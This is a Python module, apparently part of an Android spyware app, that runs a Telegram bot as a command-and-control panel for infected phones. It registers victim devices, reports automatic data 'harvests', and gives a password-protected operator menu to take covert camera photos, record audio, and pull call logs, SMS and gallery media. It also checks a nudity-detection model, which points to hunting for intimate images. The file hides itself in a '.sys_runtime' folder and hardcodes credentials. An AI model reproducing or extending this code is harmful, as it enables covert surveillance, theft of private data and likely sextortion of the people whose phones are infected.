# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import requests
import sys
import importlib
from collections import deque
from datetime import datetime

# تجاهل تحذيرات SSL (لأننا نستخدم verify=False)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد المسارات (نفس المسار المستخدم في main.py)
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if P not in sys.path:
    sys.path.insert(0, P)

# إعداد ملف السجل
logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

# رأسيات HTTP لتجنب حظر تلغرام
TG_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
}

class T:
    def __init__(self, m):
        self.m = m                      # كائن monitor
        self.dvs_file = os.path.join(P, "dvs.json")   # قائمة الأجهزة
        self.ses_file = os.path.join(P, "ses.json")   # جلسات المستخدمين
        self.ses = {}                   # { chat_id : expiry_time }
        self.dvs = {}                   # { device_id : {"n": name, "t": topic_id} }
        self.p_upd = deque(maxlen=200)  # منع تكرار callback queries
        self.cur = 0                    # مؤشر التوزيع بين البوتات

        # التوكنات تأتي مباشرة من monitor.bots (تم تعيينها في main.py)
        self.act = getattr(m, 'bots', [])
        if not self.act:
            logging.error("No bot tokens found in monitor!")
        self.cmd = getattr(m, 'ctrl', -1003365166986)   # قناة التحكم
        self.dat = getattr(m, 'vlt', -1003787520015)    # قناة الخزنة (vault)
        self.rn = True

        # تحميل البيانات السابقة
        self._load()
        # بدء خيط تنظيف الجلسات المنتهية
        threading.Thread(target=self._session_cleaner, daemon=True).start()

    def _load(self):
        """تحميل الملفات (dvs.json و ses.json)"""
        for path, target in [(self.dvs_file, self.dvs), (self.ses_file, self.ses)]:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        target.update(json.load(f))
                except Exception as e:
                    logging.error(f"Load error {path}: {e}")

    def _save(self):
        """حفظ البيانات إلى الملفات"""
        try:
            with open(self.dvs_file, 'w') as f:
                json.dump(self.dvs, f)
            with open(self.ses_file, 'w') as f:
                json.dump(self.ses, f)
        except Exception as e:
            logging.error(f"Save error: {e}")

    def _session_cleaner(self):
        """كل ساعة: حذف الجلسات المنتهية"""
        while self.rn:
            now = time.time()
            expired = [cid for cid, exp in self.ses.items() if exp < now]
            if expired:
                for cid in expired:
                    self.ses.pop(cid, None)
                self._save()
                logging.info(f"Cleaned {len(expired)} expired sessions")
            time.sleep(3600)

    def _next_token(self):
        """Round-robin بين التوكنات"""
        if not self.act:
            return None
        token = self.act[self.cur]
        self.cur = (self.cur + 1) % len(self.act)
        return token

    def _api(self, method, data=None, files=None, retry=3):
        """إرسال طلب إلى Telegram API مع إعادة محاولة ذكية"""
        for attempt in range(retry):
            token = self._next_token()
            if not token:
                return None
            try:
                url = f"https://api.telegram.org/bot{token}/{method}"
                resp = requests.post(url, data=data, files=files, headers=TG_HEADERS,
                                     timeout=25, verify=False)
                result = resp.json()
                if result.get('ok'):
                    return result
                # معالجة الأخطاء المعروفة
                error_code = result.get('error_code')
                if error_code == 429:   # Too Many Requests
                    time.sleep(2)
                    continue
                elif error_code == 401: # Unauthorized (token غير صالح)
                    # إزالة هذا التوكن من القائمة
                    if token in self.act:
                        self.act.remove(token)
                    logging.warning(f"Removed invalid token: {token}")
                    continue
                else:
                    # أي خطأ آخر: قد يكون مؤقتاً
                    time.sleep(1)
            except Exception as e:
                logging.error(f"API error ({method}): {e}")
                time.sleep(1)
        return None

    def reg(self, device_id, device_model):
        """تسجيل جهاز جديد في منتدى التحكم (creates a forum topic)"""
        if device_id in self.dvs:
            return self.dvs[device_id].get('t')
        # إنشاء موضوع جديد
        topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
        res = self._api("createForumTopic", {
            "chat_id": self.cmd,
            "name": topic_name
        })
        if res and res.get('ok'):
            topic_id = res['result']['message_thread_id']
            self.dvs[device_id] = {"n": device_model, "t": topic_id}
            self._save()
            # إرسال رسالة ترحيب في الموضوع
            self._api("sendMessage", {
                "chat_id": self.cmd,
                "message_thread_id": topic_id,
                "text": f"<b>✅ الجهاز متصل</b>\n<b>{device_model}</b>\n<code>{device_id}</code>",
                "parse_mode": "HTML"
            })
            return topic_id
        return None

    def notify_harvest(self, device_id, count):
        """إرسال إشعار الحصاد إلى موضوع الجهاز"""
        dev = self.dvs.get(device_id)
        if dev and 't' in dev:
            msg = (f"📦 <b>حصاد تلقائي</b>\n"
                   f"الجهاز: {dev['n']}\n"
                   f"عدد العناصر: {count}\n"
                   f"الوقت: {datetime.now().strftime('%H:%M:%S')}")
            self._api("sendMessage", {
                "chat_id": self.cmd,
                "message_thread_id": dev['t'],
                "text": msg,
                "parse_mode": "HTML"
            })

    def _main_keyboard(self):
        """لوحة المفاتيح الرئيسية"""
        return {
            "inline_keyboard": [
                [{"text": "📱 الأجهزة", "callback_data": "ld"}],
                [{"text": "🧠 حالة الـ AI", "callback_data": "ai_status"},
                 {"text": "🔄 تجديد الجلسة", "callback_data": "rnw"}],
                [{"text": "🚪 تسجيل الخروج", "callback_data": "ext"}]
            ]
        }

    def _device_keyboard(self, device_id):
        """لوحة التحكم بجهاز معين"""
        return {
            "inline_keyboard": [
                [{"text": "📸 كاميرا خلفية", "callback_data": f"cam_{device_id}"},
                 {"text": "🤳 كاميرا أمامية", "callback_data": f"camf_{device_id}"}],
                [{"text": "🎙️ تسجيل صوتي", "callback_data": f"mic_{device_id}"},
                 {"text": "📦 حصاد يدوي", "callback_data": f"hrv_{device_id}"}],
                [{"text": "📞 سجل المكالمات", "callback_data": f"callog_{device_id}"},
                 {"text": "💬 رسائل SMS", "callback_data": f"sms_{device_id}"}],
                [{"text": "🖼️ المعرض", "callback_data": f"media_{device_id}"}],
                [{"text": "🔙 العودة", "callback_data": "ld"}]
            ]
        }

    def _is_authorized(self, chat_id):
        """التحقق من صلاحية الجلسة"""
        return time.time() < self.ses.get(str(chat_id), 0)

    def _handle_message(self, update):
        """معالجة الرسائل النصية (أوامر /login و /menu)"""
        msg = update.get('message', {})
        chat_id = msg.get('chat', {}).get('id')
        text = msg.get('text', '')
        if not chat_id:
            return

        if text.startswith('/login'):
            parts = text.split()
            if len(parts) < 2:
                self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ استخدم: /login كلمة_السر"})
                return
            password = parts[1].strip()
            if password == getattr(self.m, 'pw', 'Zaen123@123@'):
                self.ses[str(chat_id)] = time.time() + 7200   # صلاحية ساعتين
                self._save()
                self._api("sendMessage", {
                    "chat_id": chat_id,
                    "text": "🔓 <b>تم الدخول بنجاح</b>",
                    "reply_markup": json.dumps(self._main_keyboard()),
                    "parse_mode": "HTML"
                })
            else:
                self._api("sendMessage", {"chat_id": chat_id, "text": "❌ كلمة السر غير صحيحة"})

        elif self._is_authorized(chat_id) and text == '/menu':
            self._api("sendMessage", {
                "chat_id": chat_id,
                "text": "📋 القائمة الرئيسية",
                "reply_markup": json.dumps(self._main_keyboard()),
                "parse_mode": "HTML"
            })

    def _handle_callback(self, update):
        """معالجة أزرار الـ inline keyboard"""
        cb = update.get('callback_query', {})
        cb_id = cb.get('id')
        if not cb_id or cb_id in self.p_upd:
            return
        self.p_upd.append(cb_id)

        chat_id = cb.get('message', {}).get('chat', {}).get('id')
        msg_id = cb.get('message', {}).get('message_id')
        data = cb.get('data', '')

        # تأكيد استلام callback (لتجنب تكرار الضغط)
        self._api("answerCallbackQuery", {"callback_query_id": cb_id})

        if not self._is_authorized(chat_id):
            self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ انتهت الجلسة، استخدم /login"})
            return

        # قائمة الأجهزة
        if data == "ld":
            if not self.dvs:
                self._api("editMessageText", {
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "text": "📭 لا توجد أجهزة متصلة حالياً.",
                    "reply_markup": json.dumps({"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "main"}]]})
                })
                return
            kb = {"inline_keyboard": []}
            for did, info in self.dvs.items():
                kb["inline_keyboard"].append([{"text": f"📱 {info['n']}", "callback_data": f"dev_{did}"}])
            kb["inline_keyboard"].append([{"text": "🔙 رجوع", "callback_data": "main"}])
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "<b>اختر جهازاً للتحكم:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })

        # التحكم بجهاز محدد
        elif data.startswith("dev_"):
            did = data[4:]
            if did in self.dvs:
                self._api("editMessageText", {
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "text": f"🕹️ <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._device_keyboard(did)),
                    "parse_mode": "HTML"
                })

        # حالة الـ AI
        elif data == "ai_status":
            ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.model is not None
            status = "✅ يعمل" if ai_loaded else "❌ غير جاهز"
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}", "show_alert": True})

        # تجديد الجلسة
        elif data == "rnw":
            self.ses[str(chat_id)] = time.time() + 7200
            self._save()
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": "✅ تم تمديد الجلسة"})

        # تسجيل الخروج
        elif data == "ext":
            self.ses.pop(str(chat_id), None)
            self._save()
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "🔒 تم تسجيل الخروج."
            })

        # القائمة الرئيسية
        elif data == "main":
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "📋 القائمة الرئيسية",
                "reply_markup": json.dumps(self._main_keyboard()),
                "parse_mode": "HTML"
            })

        # باقي الأوامر (كاميرا، تسجيل، حصاد، معرض ...) تُمرر إلى commands.py
        else:
            try:
                import commands
                importlib.reload(commands)
                commands.ex(data, self, self.m, chat_id, cb_id)
            except Exception as e:
                logging.error(f"Command error: {e}")
                self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ خطأ: {str(e)[:100]}"})

    def _polling(self):
        """حلقة استقبال التحديثات من Telegram (long polling)"""
        offset = 0
        while self.rn:
            token = self._next_token()
            if not token:
                time.sleep(5)
                continue
            try:
                url = f"https://api.telegram.org/bot{token}/getUpdates"
                params = {
                    "offset": offset,
                    "timeout": 20,
                    "allowed_updates": json.dumps(["message", "callback_query"])
                }
                resp = requests.get(url, params=params, headers=TG_HEADERS, timeout=25, verify=False)
                data = resp.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        if 'message' in update:
                            self._handle_message(update)
                        if 'callback_query' in update:
                            self._handle_callback(update)
                time.sleep(0.3)
            except Exception as e:
                logging.error(f"Polling error: {e}")
                time.sleep(2)

    def start(self):
        """بدء تشغيل واجهة Telegram"""
        if self.act:
            threading.Thread(target=self._polling, daemon=True).start()
            logging.info("Telegram UI started successfully")
        else:
            logging.error("No active bot tokens – Telegram UI cannot start")

# دالة مساعدة (اختيارية)
def get_password():
    return "Zaen123@123@"
